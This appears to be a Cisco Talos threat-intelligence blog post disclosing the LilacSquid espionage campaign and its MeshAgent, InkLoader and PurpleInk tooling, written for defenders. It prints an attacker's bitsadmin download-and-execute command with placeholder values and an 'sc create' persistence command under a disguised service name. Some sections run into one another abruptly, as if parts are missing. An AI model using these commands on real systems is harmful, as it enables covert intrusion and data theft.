    <h1 class="text-center">LilacSquid: The stealthy trilogy of PurpleInk, InkBox and InkLoader</h1>

    <div class="text-center m-1">
        <div class="post-author">
            <span>By </span>
                <a href="https://blog.talosintelligence.com/author/asheer-malhotra/">Asheer Malhotra</a>
        </div>

        <br/>
        <time class="post-datetime" datetime="May 30, 2024 08:01">
            Thursday, May 30, 2024 08:01
        </time>

        <div class="m-3">
                            <a href="/category/apt/" class="category primary-category">
                                APT
                            </a>
                                                    <a href="/category/malware/" class="category primary-category">
                                malware
                            </a>
                                </div>
    </div>

    <section class="post-content-wrapper mt-5">
        <div class="post-content">
            <p><em>By Anna Bennett, Nicole Hoffman, Asheer Malhotra, Sean Taylor and Brandon White.</em>&nbsp;</p><ul><li>Cisco Talos is disclosing a new suspected data theft campaign, active since at least 2021, we attribute to an advanced persistent threat actor (APT) we’re calling “LilacSquid.”&nbsp;&nbsp;</li><li>LilacSquid’s victimology includes a diverse set of victims consisting of information technology organizations building software for the research and industrial sectors in the United States, organizations in the energy sector in Europe and the pharmaceutical sector in Asia indicating that the threat actor (TA) may be agnostic of industry verticals and trying to steal data from a variety of sources.&nbsp;&nbsp;</li><li>This campaign uses MeshAgent, an open-source remote management tool, and a customized version of QuasarRAT we’re calling “PurpleInk” to serve as the primary implants after successfully compromising vulnerable application servers exposed to the internet.&nbsp;&nbsp;</li><li>This campaign leverages vulnerabilities in public-facing application servers and compromised remote desktop protocol (RDP) credentials to orchestrate the deployment of a variety of open-source tools, such as MeshAgent and SSF, alongside customized malware, such as "PurpleInk," and two malware loaders we are calling "InkBox" and "InkLoader.”&nbsp;&nbsp;</li><li>The campaign is geared toward establishing long-term access to compromised victim organizations to enable LilacSquid to siphon data of interest to attacker-controlled servers.&nbsp;</li></ul><h1 id="lilacsquid-%E2%80%93-an-espionage-motivated-threat-actor">LilacSquid – An espionage-motivated threat actor&nbsp;</h1><p>Talos assesses with high confidence that this campaign has been active since at least 2021 and the successful compromise and post-compromise activities are geared toward establishing long-term access for data theft by an advanced persistent threat (APT) actor we are tracking as "LilacSquid" and UAT-4820. Talos has observed at least three successful compromises spanning entities in Asia, Europe and the United States consisting of industry verticals such as pharmaceuticals, oil and gas, and technology.&nbsp;</p><p>Previous intrusions into software manufacturers, such as the <a href="http://3cx/" rel="noreferrer noopener"><u>3CX</u></a> and <a href="https://thehackernews.com/2023/04/lazarus-xtrader-hack-impacts-critical.html" rel="noreferrer noopener"><u>X_Trader</u></a> compromises by Lazarus, indicate that unauthorized long-term access to organizations that manufacture and distribute popular software for enterprise and industrial organizations can open avenues of supply chain compromise proving advantageous to threat actors such as LilacSquid, allowing them to widen their net of targets. &nbsp;</p><p>We have observed two different types of initial access techniques deployed by LilacSquid, including exploiting vulnerabilities and the use of compromised remote desktop protocol (RDP) credentials. Post-exploitation activity in this campaign consists of the deployment of MeshAgent, an open-source remote management and desktop session application, and a heavily customized version of QuasarRAT that we track as “PurpleInk” allowing LilacSquid to gain complete control over the infected systems. Additional means of persistence used by LilacSquid include the use of open-source tools such as Secure Socket Funneling (SSF), which is a tool for proxying and tunneling multiple sockets through a single secure TLS tunnel to a remote computer.&nbsp;</p><p>It is worth noting that multiple tactics, techniques, tools and procedures (TTPs) utilized in this campaign bear some overlap with North Korean APT groups, such as <a href="https://blog.talosintelligence.com/lazarus_new_rats_dlang_and_telegram/" rel="noreferrer noopener"><u>Andariel and its parent umbrella group, Lazarus</u></a>. Public reporting has noted Andariel’s use of <a href="https://asec.ahnlab.com/en/63192/" rel="noreferrer noopener"><u>MeshAgent</u></a> as a tool for maintaining post-compromise access after successful exploitation. Furthermore, Talos has observed Lazarus extensively use SOCKs proxy and tunneling tools, along with custom-made malware as part of their post-compromise <a href="https://blog.talosintelligence.com/lazarus-three-rats/" rel="noreferrer noopener"><u>playbooks</u> to act as channels of secondary access and exfiltration</a>. This tactic has also been seen in this campaign operated by LilacSquid where the threat actor deployed SSF along with other malware to create tunnels to their remote servers.&nbsp;</p><h1 id="lilacsquid%E2%80%99s-infection-chains">LilacSquid’s infection chains&nbsp;</h1><p>There are primarily two types of infection chains that LilacSquid uses in this campaign. The first involves the successful exploitation of a vulnerable web application, while the other is the use of compromised RDP credentials. Successful compromise of a system leads to LilacSquid deploying multiple vehicles of access onto compromised hosts, including dual-use tools such as <a href="https://meshcentral.com/" rel="noreferrer noopener"><u>MeshAgent</u></a>, <a href="https://github.com/securesocketfunneling/ssf" rel="noreferrer noopener"><u>Secure Socket Funneling (SSF)</u></a>, InkLoader and PurpleInk.&nbsp;</p><p>Successful exploitation of the vulnerable application results in the attackers deploying a script that will set up working directories for the malware and then download and execute MeshAgent from a remote server. On execution, MeshAgent will connect to its C2, carry out preliminary reconnaissance and begin downloading and activating other implants on the system, such as SSF and PurpleInk.&nbsp;</p><p>MeshAgent is typically downloaded by the attackers using the bitsadmin utility and then executed to establish contact with the C2:&nbsp;</p>
<!--kg-card-begin: html-->
bitsadmin /transfer -job_name- /download /priority normal -remote_URL- -local_path_for_MeshAgent- 
-local_path_for_MeshAgent- connect 
<!--kg-card-end: html-->
<figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/05/data-src-image-b1903d40-9045-4abf-8642-683eac6843d4.jpeg" class="kg-image" alt="" loading="lazy" width="1600" height="1497" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/05/data-src-image-b1903d40-9045-4abf-8642-683eac6843d4.jpeg 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/05/data-src-image-b1903d40-9045-4abf-8642-683eac6843d4.jpeg 1000w, https://blog.talosintelligence.com/content/images/2024/05/data-src-image-b1903d40-9045-4abf-8642-683eac6843d4.jpeg 1600w" sizes="(min-width: 720px) 720px"></figure><h2 id="instrumenting-inkloader-%E2%80%93-modularizing-the-infection-chain">Instrumenting InkLoader – Modularizing the infection chain&nbsp;</h2><p>When compromised RDP credentials were used to gain access, the infection chain was altered slightly. LilacSquid chose to either deploy MeshAgent and subsequent implants, or introduce another component in the infection preceding PurpleInk. &nbsp;</p><p>InkLoader is a simple, yet effective DOT NET-based malware loader. It is written to run a hardcoded executable or command. In this infection chain, InkLoader is the component that persists across reboots on the infected host instead of the actual malware it runs. So far, we have only seen PurpleInk being executed via InkLoader, but LilacSquid may likely use InkLoader to deploy additional malware implants.&nbsp;</p><p>Talos observed LilacSquid deploy InkLoader in conjunction with PurpleInk only when they could successfully create and maintain remote sessions via remote desktop (RDP) by exploiting the use of stolen credentials to the target host. A successful login via RDP leads to the download of InkLoader and PurpleInk, copying these artifacts into desired directories on disk and the subsequent registration of InkLoader as a service that is then started to deploy InkLoader and, in turn, PurpleInk. The infection chain can be visualized as:&nbsp;</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/05/data-src-image-7650466a-ab1c-4bf1-a3f8-d4b6df02c1d0.jpeg" class="kg-image" alt="" loading="lazy" width="1600" height="1041" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/05/data-src-image-7650466a-ab1c-4bf1-a3f8-d4b6df02c1d0.jpeg 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/05/data-src-image-7650466a-ab1c-4bf1-a3f8-d4b6df02c1d0.jpeg 1000w, https://blog.talosintelligence.com/content/images/2024/05/data-src-image-7650466a-ab1c-4bf1-a3f8-d4b6df02c1d0.jpeg 1600w" sizes="(min-width: 720px) 720px"></figure><p>Service creation and execution on the endpoint is typically done via the command line interface using the commands:&nbsp;</p>
<!--kg-card-begin: html-->
<pre>
sc create TransactExDetect displayname=Extended Transaction Detection binPath= _filepath_of_InkLoader_ start= auto

<h1 id="purpleink-%E2%80%93-lilacsquids-bespoke-implant">PurpleInk – LilacSquid's bespoke implant&nbsp;</h1><p>PurpleInk, LilacSquid’s primary implant of choice, has been adapted from QuasarRAT, a popular remote access trojan family. Although QuasarRAT has been available to threat actors since at least <a href="https://www.cisa.gov/news-events/analysis-reports/ar18-352a" rel="noreferrer noopener"><u>2014</u></a>, we observed PurpleInk being actively developed starting in 2021 and continuing to evolve its functionalities separate from its parent malware family.&nbsp;&nbsp;</p><p>PurpleInk uses an accompanying configuration file to obtain information such as the C2 server’s address and port. This file is typically base64-decoded and decrypted to obtain the configuration strings required by PurpleInk.&nbsp;</p><p>PurpleInk is a highly versatile implant that is heavily obfuscated and contains a variety of RAT capabilities. Talos has observed multiple variants of PurpleInk where functionalities have both been introduced and removed.&nbsp;</p><p>In terms of RAT capabilities, PurpleInk can perform the following actions on the infected host:&nbsp;</p><ul><li>Enumerate the process and send the process ID, name and associated Window Title to the C2.&nbsp;</li><li>Terminate a process ID (PID) specified by the C2 on the infected host.&nbsp;</li><li>Run a new application on the host – start process.&nbsp;</li><li>Get drive information for the infected host, such as volume labels, root directory names, drive type and drive format.&nbsp;</li><li>Enumerate a given directory to obtain underlying directory names, file names and file sizes.&nbsp;</li><li>Read a file specified by the C2 and exfiltrate its contents.&nbsp;</li><li>Replace or append content to a specified file.&nbsp;</li></ul><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/05/data-src-image-c9b88543-8694-4fcc-88dc-2abb4d8f00fa.png" class="kg-image" alt="" loading="lazy" width="1600" height="478" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/05/data-src-image-c9b88543-8694-4fcc-88dc-2abb4d8f00fa.png 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/05/data-src-image-c9b88543-8694-4fcc-88dc-2abb4d8f00fa.png 1000w, https://blog.talosintelligence.com/content/images/2024/05/data-src-image-c9b88543-8694-4fcc-88dc-2abb4d8f00fa.png 1600w" sizes="(min-width: 720px) 720px"></figure><ul><li>Gather system information about the infected host using WMI queries. <p>Being a remote device management utility, MeshAgent allows an operator to control almost all aspects of the device via the MeshCentral server, providing capabilities such as:&nbsp;</p><ul><li>List all devices in the Mesh (list of victims).&nbsp;</li><li>View and control desktop.&nbsp;</li><li>Manage files on the system.&nbsp;</li><li>View software and hardware information about the device.&nbsp;&nbsp;</li></ul><p>Post-exploitation, MeshAgent activates other dual-use and malicious tools on the infected systems, such as SSF and PurpleInk.&nbsp;&nbsp;</p><h1 id="coverage">Coverage&nbsp;</h1><p>Ways our customers can detect and block this threat are listed below.&nbsp;</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/2024/05/data-src-image-32daf6c7-e2b1-4e51-b44e-d35e8bcb3548.jpeg" class="kg-image" alt="" loading="lazy" width="1600" height="323" srcset="https://blog.talosintelligence.com/content/images/size/w600/2024/05/data-src-image-32daf6c7-e2b1-4e51-b44e-d35e8bcb3548.jpeg 600w, https://blog.talosintelligence.com/content/images/size/w1000/2024/05/data-src-image-32daf6c7-e2b1-4e51-b44e-d35e8bcb3548.jpeg 1000w, https://blog.talosintelligence.com/content/images/2024/05/data-src-image-32daf6c7-e2b1-4e51-b44e-d35e8bcb3548.jpeg 1600w" sizes="(min-width: 720px) 720px"></figure><p><a href="https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html?ref=cisco-talos-blog" rel="noreferrer noopener"><u>Cisco Secure Endpoint</u></a> (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post.
